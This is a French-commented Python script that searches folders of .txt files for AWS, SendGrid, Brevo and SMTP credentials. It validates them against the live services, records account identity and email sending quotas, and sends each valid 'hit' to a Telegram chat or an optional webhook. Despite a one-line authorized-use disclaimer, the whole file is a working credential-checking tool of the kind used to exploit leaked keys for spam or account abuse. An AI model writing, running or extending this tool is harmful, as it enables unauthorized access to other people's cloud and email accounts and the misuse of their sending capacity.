#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Analyse de fichiers .txt : repère AWS, SendGrid, Brevo et configs SMTP, valide quand
c’est possible, relève quota / infos, et notifie Telegram sur les accès valides.
À n’utiliser que sur des données / comptes pour lesquels vous êtes autorisé.
"""

from __future__ import annotations

import html
import json
import os
import re
import smtplib
import ssl
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable, Optional

import requests

try:
    import boto3
    from botocore.exceptions import ClientError
except ImportError:
    boto3 = None
    ClientError = Exception  # type: ignore[misc, assignment]

# Access Key ID AWS = 4 caractères de préfixe + 16 alphanum
_AWS_ACCESS = re.compile(
    r"\b((?:AKIA|ASIA|AIDA|AROA|ASCA|ABIA|AIPA|AISA|ACCA|APKA)[0-9A-Z]{16})\b"
)
_AWS_SECRET = re.compile(r"\b([A-Za-z0-9+/]{40})(?![A-Za-z0-9+/])")

_SENDGRID = re.compile(r"\b(SG\.[0-9A-Za-z_\-]{10,}\.[0-9A-Za-z_\-]{10,})\b")
# Clés v3 Brevo (xkeysib-…)
_BREVO = re.compile(r"\b(xkeysib-[a-f0-9-]{8,200})\b", re.IGNORECASE)

_SMTP_HOST = re.compile(
    r"(?im)^\s*"
    r"(?:(SMTP|MAIL)_(?:HOST|SERVER|URL)|smtp[_\.]?(?:host|server|url))\s*[=:]\s*"
    r"['\"]?([^\s'\"#]+)['\"]?",
)
_SMTP_USER = re.compile(
    r"(?im)^\s*(?:(?:SMTP|MAIL)_(?:USER|USERNAME|USER_NAME|LOGIN|FROM)|smtp[_\.]user)\s*"
    r"[=:]\s*['\"]?([^\r\n#\"]+)['\"]?",
)
_SMTP_PASS = re.compile(
    r"(?im)^\s*(?:(?:SMTP|MAIL)_(?:PASS|PASSWORD|PWD|SECRET|API_KEY)|smtp[_\.]pass)\s*"
    r"[=:]\s*['\"]?([^\r\n#\"]+)['\"]?",
)
_SMTP_PORT = re.compile(
    r"(?im)^\s*(?:(?:SMTP|MAIL)_PORT|smtp[_\.]port)\s*[=:]\s*['\"]?(\d{1,5})",
)


def _mask(s: str, n: int = 4) -> str:
    if not s or len(s) <= n * 2:
        return "•••"
    return f"{s[:n]}…{s[-n:]}"


def _e(s: str) -> str:
    return html.escape(s, quote=True)


def _iter_txt_files(root: Path) -> Iterable[Path]:
    for p in root.rglob("*.txt"):
        if p.is_file():
            yield p


def _read_text_safe(path: Path) -> str:
    try:
        return path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return ""


@dataclass
class SMTPConfig:
    host: str
    port: int
    user: str
    password: str
    source_file: str = ""


def _extract_aws_creds(text: str) -> list[tuple[str, str]]:
    out: list[tuple[str, str]] = []
    for m_access in _AWS_ACCESS.finditer(text):
        acc = m_access.group(1)
        lo = max(0, m_access.start() - 500)
        hi = min(len(text), m_access.end() + 500)
        window = text[lo:hi]
        for m_sec in _AWS_SECRET.finditer(window):
            sec = m_sec.group(1)
            if len(sec) != 40 or sec == acc or acc in sec:
                continue
            out.append((acc, sec))
    return out


def _parse_smtp_in_file(text: str, filename: str) -> list[SMTPConfig]:
    if not _SMTP_HOST.search(text) or not _SMTP_USER.search(text) or not _SMTP_PASS.search(
        text
    ):
        return []
    out: list[SMTPConfig] = []
    u_m = _SMTP_USER.search(text)
    p_m = _SMTP_PASS.search(text)
    if not u_m or not p_m:
        return []
    user, pwd = u_m.group(1).strip(), p_m.group(1).strip()
    port_m = _SMTP_PORT.search(text)
    try:
        port = int(port_m.group(1)) if port_m else 587
    except (ValueError, AttributeError):
        port = 587
    for m in _SMTP_HOST.finditer(text):
        h = m.group(2).strip()
        if h:
            out.append(
                SMTPConfig(
                    host=h,
                    port=port,
                    user=user,
                    password=pwd,
                    source_file=filename,
                )
            )
    return out


@dataclass
class Hit:
    kind: str
    valid: bool
    message: str
    quota: Optional[str] = None
    detail: str = ""
    raw_ref: str = ""


def validate_aws(access: str, secret: str) -> tuple[bool, str, Optional[str]]:
    if boto3 is None:
        return False, "boto3 absent (pip install -r requirements.txt)", None
    regions = ["us-east-1", "us-west-2", "eu-west-1", "eu-west-3", "ap-southeast-1"]
    identity: Optional[dict] = None
    last_err: Optional[str] = None
    for r in regions:
        try:
            sts = boto3.client(
                "sts",
                region_name=r,
                aws_access_key_id=access,
                aws_secret_access_key=secret,
            )
            identity = sts.get_caller_identity()
            break
        except ClientError as e:  # type: ignore[misc]
            last_err = str(e)
    if not identity:
        return False, f"STS rejeté: {last_err or 'inconnu'}", None

    acc_id = str(identity.get("Account", "?"))
    arn = str(identity.get("Arn", ""))
    msg = f"Compte {acc_id} — {arn[:100]}"

    quota: Optional[str] = None
    for r in regions:
        try:
            ses = boto3.client(
                "ses",
                region_name=r,
                aws_access_key_id=access,
                aws_secret_access_key=secret,
            )
            q = ses.get_send_quota()
            sent = int(q.get("SentLast24Hours", 0))
            cap = int(q.get("Max24HourSend", 0))
            quota = f"SES ({r}): 24h envoyés={sent}, plafond 24h={cap}"
            break
        except ClientError:
            continue
    if quota is None:
        quota = "SES: quota indisponible (pas d’autorisation ou mauvaise région)"
    return True, msg, quota


def validate_sendgrid(key: str) -> tuple[bool, str, Optional[str]]:
    r = requests.get(
        "https://api.sendgrid.com/v3/user/credits",
        headers={"Authorization": f"Bearer {key}"},
        timeout=25,
    )
    if r.status_code != 200:
        return False, f"API {r.status_code}: {r.text[:200]}", None
    try:
        d = r.json()
    except json.JSONDecodeError:
        d = {}
    t, u, rem = d.get("total"), d.get("used"), d.get("remaining", d.get("remain"))
    if t is not None:
        q = f"Crédits — total: {t}, utilisé: {u}, restant: {rem}"
    else:
        q = json.dumps(d, ensure_ascii=False)[:600]
    return True, "SendGrid API OK", q


def validate_brevo(key: str) -> tuple[bool, str, Optional[str]]:
    r = requests.get(
        "https://api.brevo.com/v3/account",
        headers={"api-key": key},
        timeout=25,
    )
    if r.status_code != 200:
        return False, f"API {r.status_code}: {r.text[:200]}", None
    try:
        d = r.json()
    except json.JSONDecodeError:
        d = {}
    plan = d.get("plan", d.get("planName", "—"))
    email = d.get("email", "—")
    cr = d.get("credits")
    if isinstance(cr, dict):
        q = f"Compte: {email} — plan: {plan} — crédits: {cr}"
    else:
        q = f"Compte: {email} — plan: {plan} — {str(d)[:400]}"
    return True, "Brevo API OK", q


def validate_smtp(cfg: SMTPConfig) -> tuple[bool, str, Optional[str]]:
    context = ssl.create_default_context()
    last_err: Optional[str] = None
    to_try: list[int] = []
    for p in (cfg.port, 465, 587):
        if p and p not in to_try:
            to_try.append(p)
    for attempt in to_try:
        try:
            if attempt == 465:
                with smtplib.SMTP_SSL(cfg.host, 465, context=context, timeout=25) as s:
                    s.login(cfg.user, cfg.password)
            else:
                with smtplib.SMTP(cfg.host, attempt, timeout=25) as s:
                    s.ehlo()
                    s.starttls(context=context)
                    s.ehlo()
                    s.login(cfg.user, cfg.password)
            return (
                True,
                f"Auth SMTP {cfg.host}:{attempt} OK",
                "Aucun quota côté SMTP (session authentifiée).",
            )
        except (OSError, smtplib.SMTPException, ssl.SSLError) as e:
            last_err = str(e)
    return False, last_err or "échec SMTP", None


def _telegram_url(bot_token: str) -> str:
    base = os.environ.get("TELEGRAM_API_BASE", "https://api.telegram.org").rstrip("/")
    return f"{base}/bot{bot_token}/sendMessage"


def send_telegram(text: str, bot_token: str, chat_id: str) -> bool:
    url = _telegram_url(bot_token)
    payload = {
        "chat_id": chat_id,
        "text": text[:4090],
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    h = {
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "credential-checker/1.0",
    }
    wh = os.environ.get("TELEGRAM_WEBHOOK_URL", "").strip()
    if wh:
        r = requests.post(wh, json={"chat_id": chat_id, "message": text[:4090], "raw": text}, timeout=30, headers=h)
    else:
        r = requests.post(url, json=payload, timeout=30, headers=h)
    if r.status_code == 200:
        try:
            return r.json().get("ok", True)
        except (json.JSONDecodeError, TypeError, ValueError):
            return True
    return False


def format_hit_message(h: Hit) -> str:
    em = {"aws": "☁️", "sendgrid": "📧", "brevo": "✉️", "smtp": "📤"}
    titles = {
        "aws": "Hit AWS",
        "sendgrid": "Hit SendGrid",
        "brevo": "Hit Brevo",
        "smtp": "Hit SMTP",
    }
    t = f"{em.get(h.kind, '✨')} <b>{_e(titles.get(h.kind, h.kind))}</b>"
    status = "✅ valide" if h.valid else "❌ invalide / erreur"
    lines = [t, f"{status} — {_e(h.message)}"]
    if h.raw_ref:
        lines.append(f"🔑 <code>{_e(h.raw_ref)}</code>")
    if h.quota:
        lines.append(f"📊 <b>Quota / détail :</b> {_e(h.quota)}")
    if h.detail:
        lines.append(f"ℹ️ {_e(h.detail)}")
    return "\n".join(lines)


def _notify(h: Hit, token: str, chat: str) -> None:
    if h.valid:
        send_telegram(format_hit_message(h), token, chat)
        print(f"[OK] {h.kind}: notification envoyée")
    else:
        print(f"[--] {h.kind}: ignoré (non valide) — {h.message}")


def main() -> int:
    print("Checker AWS / SendGrid / Brevo / SMTP + Telegram\n")
    folder = input("Dossier contenant les .txt (récursif) : ").strip() or "."
    root = Path(folder).expanduser().resolve()
    if not root.is_dir():
        print(f"Dossier introuvable : {root}", file=sys.stderr)
        return 1

    token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    chat = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
    if not token or not chat:
        print("Variables d’environnement requises : TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID", file=sys.stderr)
        return 1

    files: dict[str, str] = {}
    for fpath in _iter_txt_files(root):
        files[str(fpath)] = _read_text_safe(fpath)
    if not files:
        print("Aucun fichier .txt trouvé.")
        return 0

    seen: set[str] = set()

    for fpath, text in files.items():
        for acc, sec in _extract_aws_creds(text):
            dedup = f"aws|{acc}|{sec}"
            if dedup in seen:
                continue
            seen.add(dedup)
            ok, msg, q = validate_aws(acc, sec)
            h = Hit(
                kind="aws",
                valid=ok,
                message=msg,
                quota=q,
                raw_ref=f"{_mask(acc)} + secret {_mask(sec)}",
            )
            _notify(h, token, chat)

        for m in _SENDGRID.finditer(text):
            k = m.group(1)
            d = f"sg|{k}"
            if d in seen:
                continue
            seen.add(d)
            ok, msg, q = validate_sendgrid(k)
            h = Hit(
                kind="sendgrid",
                valid=ok,
                message=msg,
                quota=q,
                raw_ref=_mask(k, 6),
            )
            _notify(h, token, chat)

        for m in _BREVO.finditer(text):
            k = m.group(1)
            d = f"br|{k}"
            if d in seen:
                continue
            seen.add(d)
            ok, msg, q = validate_brevo(k)
            h = Hit(
                kind="brevo",
                valid=ok,
                message=msg,
                quota=q,
                raw_ref=_mask(k, 6),
            )
            _notify(h, token, chat)

        for cfg in _parse_smtp_in_file(text, fpath):
            d = f"smtp|{cfg.host}|{cfg.port}|{cfg.user}"
            if d in seen:
                continue
            seen.add(d)
            ok, msg, q = validate_smtp(cfg)
            h = Hit(
                kind="smtp",
                valid=ok,
                message=msg,
                quota=q,
                raw_ref=f"{_mask(cfg.user)} @ {_mask(cfg.host)} (fichier: {Path(cfg.source_file).name})",
            )
            _notify(h, token, chat)

    print("\nTerminé.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
